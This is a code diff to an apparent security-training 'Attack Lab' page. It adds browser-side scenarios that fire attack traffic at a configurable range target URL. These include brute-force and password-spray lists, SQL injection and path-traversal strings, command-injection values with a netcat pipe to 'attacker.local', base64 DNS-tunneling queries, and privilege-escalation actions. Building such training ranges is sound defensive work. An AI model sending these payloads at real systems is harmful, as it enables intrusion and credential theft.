@@ -15,7 +15,7 @@ import {
   Zap,
 } from "lucide-react";
 import Link from "next/link";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { toast } from "sonner";
 
 import { Badge } from "@/components/ui/badge";
@@ -166,6 +166,10 @@ const ICONS: Record<string, typeof FlaskConical> = {
   range_exfiltration: Database,
   range_ransomware: Zap,
   range_port_scan: Network,
+  range_dns_tunneling: Network,
+  range_password_spray: Shield,
+  range_command_injection: Terminal,
+  range_privilege_escalation: AlertTriangle,
 };
 
 function invalidateSoc(qc: ReturnType<typeof useQueryClient>) {
@@ -174,6 +178,165 @@ function invalidateSoc(qc: ReturnType<typeof useQueryClient>) {
   qc.invalidateQueries({ queryKey: ["events"] });
   qc.invalidateQueries({ queryKey: ["dashboard-summary"] });
   qc.invalidateQueries({ queryKey: ["dashboard-charts"] });
+}
+
+function suggestDeviceLaunchUrl(publicUrl?: string): string {
+  if (typeof window === "undefined") {
+    return publicUrl ?? "http://127.0.0.1:8088";
+  }
+  const host = window.location.hostname || "127.0.0.1";
+  const proto = window.location.protocol || "http:";
+  return `${proto}//${host}:8088`;
+}
+
+async function postJson(url: string, payload: Record<string, unknown>): Promise<void> {
+  const res = await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+  });
+  if (!res.ok) {
+    const text = await res.text().catch(() => "");
+    throw new Error(`Request failed (${res.status}) ${text || url}`);
+  }
+}
+
+async function runRangeScenarioFromDevice(
+  scenarioId: string,
+  targetBaseUrl: string,
+): Promise<number> {
+  const base = targetBaseUrl.replace(/\/+$/, "");
+
+  if (scenarioId === "range_brute_force") {
+    const attempts = [
+      "password123",
+      "admin",
+      "welcome",
+      "letmein",
+      "qwerty123",
+      "summer2026",
+      "cyberguard",
+      "wrongpass",
+      "demo12345",
+      "changeme2026",
+      "CyberGuard!2026",
+    ];
+    for (const password of attempts) {
+      await postJson(`${base}/login`, { username: "admin", password });
+    }
+    return attempts.length;
+  }
+
+  if (scenarioId === "range_sql_injection") {
+    const payloads = [
+      "normal query",
+      "' OR '1'='1'--",
+      "demo' UNION SELECT username,password FROM users--",
+    ];
+    for (const query of payloads) {
+      await fetch(`${base}/search?q=${encodeURIComponent(query)}`);
+    }
+    return payloads.length;
+  }
+
+  if (scenarioId === "range_path_traversal") {
+    const paths = ["public/readme.txt", "../../etc/passwd", "..\\..\\windows\\win.ini"];
+    for (const path of paths) {
+      await fetch(`${base}/files?path=${encodeURIComponent(path)}`);
+    }
+    return paths.length;
+  }
+
+  if (scenarioId === "range_exfiltration") {
+    const files = [
+      { file: "sensitive/customer_database_export.csv", size_mb: 80, username: "contractor1" },
+      { file: "sensitive/hr_salary_q4.xlsx", size_mb: 100, username: "contractor1" },
+      { file: "sensitive/customer_database_export.csv", size_mb: 120, username: "contractor1" },
+    ];
+    for (const body of files) {
+      await postJson(`${base}/exfil`, body);
+    }
+    return files.length;
+  }
+
+  if (scenarioId === "range_ransomware") {
+    await fetch(`${base}/ransomware/simulate`, { method: "POST" });
+    return 1;
+  }
+
+  if (scenarioId === "range_dns_tunneling") {
+    const queries = [
+      "healthcheck.local",
+      "c2VjcmV0LXNlZ21lbnQtMDE=.corp.lab.local",
+      "Y3JlZGVudGlhbD1hZG1pbjpQYXNzMTIz.corp.lab.local",
+      "ZmlsZT1jdXN0b21lcnMuY3N2JmNodW5rPTM=.corp.lab.local",
+      "ZXhmaWw9cGF5cm9sbC1kYXRhJmNoZWNrPTQ=.corp.lab.local",
+    ];
+    for (const query of queries) {
+      await postJson(`${base}/dns/query`, { query });
+    }
+    return queries.length;
+  }
+
+  if (scenarioId === "range_password_spray") {
+    const usernames = [
+      "admin",
+      "it.support",
+      "finance.manager",
+      "ceo.assistant",
+      "ops.lead",
+      "analyst",
+      "helpdesk",
+      "intern",
+      "hr.manager",
+      "developer",
+    ];
+    for (const username of usernames) {
+      await postJson(`${base}/auth/spray`, { username, password: "Winter2026!" });
+    }
+    return usernames.length;
+  }
+
+  if (scenarioId === "range_command_injection") {
+    const payloads = [
+      "report.csv",
+      "report.csv; whoami",
+      "backup.tar && id",
+      "$(cat /etc/passwd)",
+      "audit.log | nc attacker.local 4444",
+    ];
+    for (const input of payloads) {
+      await postJson(`${base}/exec`, { input });
+    }
+    return payloads.length;
+  }
+
+  if (scenarioId === "range_privilege_escalation") {
+    const actions = [
+      { username: "analyst", action: "sudo -l" },
+      { username: "analyst", action: "sudo su -" },
+      { username: "service.backup", action: "token::elevate" },
+      { username: "service.backup", action: "add user to administrators" },
+    ];
+    for (const body of actions) {
+      await postJson(`${base}/priv-esc`, body);
+    }
+    return actions.length;
+  }
+
+  if (scenarioId === "range_port_scan") {
+    const ports = Array.from({ length: 16 }, (_, idx) => 8088 + idx);
+    for (const port of ports) {
+      try {
+        await fetch(`${base.replace(/:\d+$/, `:${port}`)}/health`);
+      } catch {
+        // ignore; probes still count as attempts from demo perspective
+      }
+    }
+    return ports.length;
+  }
+
+  throw new Error(`Unsupported scenario for device launch: ${scenarioId}`);
 }
 
 function ResultModal({
@@ -330,6 +493,7 @@ export default function AttackLabPage() {
   /** Range scenario id for terminal script, or manual_collect; null when synthetic. */
   const [modalRangeScenarioId, setModalRangeScenarioId] = useState<string | null>(null);
   const [rangeTerminalLaunchKey, setRangeTerminalLaunchKey] = useState(0);
+  const [deviceLaunchBaseUrl, setDeviceLaunchBaseUrl] = useState("http://127.0.0.1:8088");
 
   const rangeStatus = useQuery({
     queryKey: ["range-status"],
@@ -340,6 +504,13 @@ export default function AttackLabPage() {
     queryKey: ["range-scenarios"],
     queryFn: () => apiFetch<RangeScenario[]>("/range/scenarios"),
   });
+
+  useEffect(() => {
+    setDeviceLaunchBaseUrl((prev) => {
+      if (prev !== "http://127.0.0.1:8088") return prev;
+      return suggestDeviceLaunchUrl(rangeStatus.data?.public_url);
+    });
+  }, [rangeStatus.data?.public_url]);
 
   const closeConsole = () => {
     setSimulationOpen(false);
@@ -369,6 +540,30 @@ export default function AttackLabPage() {
       setModalResult(result);
       invalidateSoc(qc);
       toast.success("Cyber range scenario completed");
+    },
+    onError: (e: Error) => {
+      toast.error(e.message);
+      setModalResult(null);
+      setSimulationOpen(false);
+    },
+  });
+
+  const deviceLaunch = useMutation({
+    mutationFn: async (scenario: RangeScenario) => {
+      const requestsExecuted = await runRangeScenarioFromDevice(scenario.id, deviceLaunchBaseUrl);
+      const collected = await apiFetch<RangeRunResult>("/range/collect", { method: "POST" });
+      return {
+        ...collected,
+        scenario_id: scenario.id,
+        name: scenario.name,
+        requests_executed: requestsExecuted,
+        message: `Launched from this browser/device via ${deviceLaunchBaseUrl}. ${collected.message}`,
+      } as RangeRunResult;
+    },
+    onSuccess: (result) => {
+      setModalResult(result);
+      invalidateSoc(qc);
+      toast.success("Device-origin attack launched and logs collected");
     },
     onError: (e: Error) => {
       toast.error(e.message);
@@ -409,7 +604,10 @@ export default function AttackLabPage() {
   });
 
   const consoleBusy =
-    syntheticLaunch.isPending || rangeLaunch.isPending || collectLogs.isPending;
+    syntheticLaunch.isPending ||
+    rangeLaunch.isPending ||
+    collectLogs.isPending ||
+    deviceLaunch.isPending;
 
   const openSynthetic = (scenario: SyntheticScenario) => {
     setSimulationOpen(true);
@@ -430,6 +628,17 @@ export default function AttackLabPage() {
     setModalRangeScenarioId(scenario.id);
     setRangeTerminalLaunchKey((k) => k + 1);
     rangeLaunch.mutate(scenario.id);
+  };
+
+  const openDeviceRange = (scenario: RangeScenario) => {
+    setSimulationOpen(true);
+    void rangeStatus.refetch();
+    setModalTitle(`${scenario.name} (device-origin)`);
+    setModalMode("range");
+    setModalResult(null);
+    setModalRangeScenarioId(scenario.id);
+    setRangeTerminalLaunchKey((k) => k + 1);
+    deviceLaunch.mutate(scenario);
   };
 
   const rangeHealthy = rangeStatus.data?.healthy ?? false;
@@ -488,7 +697,18 @@ export default function AttackLabPage() {
                 ) : null}
               </div>
             </div>
-            <div className="flex gap-2">
+            <div className="space-y-2">
+              <label className="block text-[11px] font-medium text-cyan-200">
+                Launch-from-device target URL
+              </label>
+              <input
+                className="h-8 w-full rounded-md border border-cyan-500/25 bg-black/40 px-2 text-xs text-cyan-100 outline-none ring-cyan-500/40 placeholder:text-cyan-100/40 focus:ring"
+                value={deviceLaunchBaseUrl}
+                onChange={(e) => setDeviceLaunchBaseUrl(e.target.value)}
+                placeholder="http://192.168.1.50:8088"
+                aria-label="Launch-from-device target URL"
+              />
+              <div className="flex gap-2">
               <Button variant="outline" onClick={() => collectLogs.mutate()} disabled={collectLogs.isPending}>
                 <Database className="mr-2 h-4 w-4" />
                 Collect Range Logs
@@ -497,6 +717,7 @@ export default function AttackLabPage() {
                 <RotateCcw className="mr-2 h-4 w-4" />
                 Reset Range
               </Button>
+              </div>
             </div>
           </div>
 
@@ -566,7 +787,7 @@ export default function AttackLabPage() {
                         ))}
                       </div>
                     )}
-                    <div className="mt-auto pt-1">
+                    <div className="mt-auto space-y-2 pt-1">
                       <Tooltip>
                         <TooltipTrigger
                           render={
@@ -583,6 +804,24 @@ export default function AttackLabPage() {
                         />
                         <TooltipContent className="max-w-sm text-xs">
                           Executes a fixed local-only scenario against the disposable Docker target.
+                        </TooltipContent>
+                      </Tooltip>
+                      <Tooltip>
+                        <TooltipTrigger
+                          render={
+                            <Button
+                              variant="outline"
+                              size="sm"
+                              className="w-full border-cyan-400/40 text-cyan-200"
+                              disabled={!rangeHealthy || deviceLaunch.isPending}
+                              onClick={() => openDeviceRange(scenario)}
+                            >
+                              Launch From This Device
+                            </Button>
+                          }
+                        />
+                        <TooltipContent className="max-w-sm text-xs">
+                          Browser sends requests directly to the target URL above, then collects logs into this account.
                         </TooltipContent>
                       </Tooltip>
                     </div>
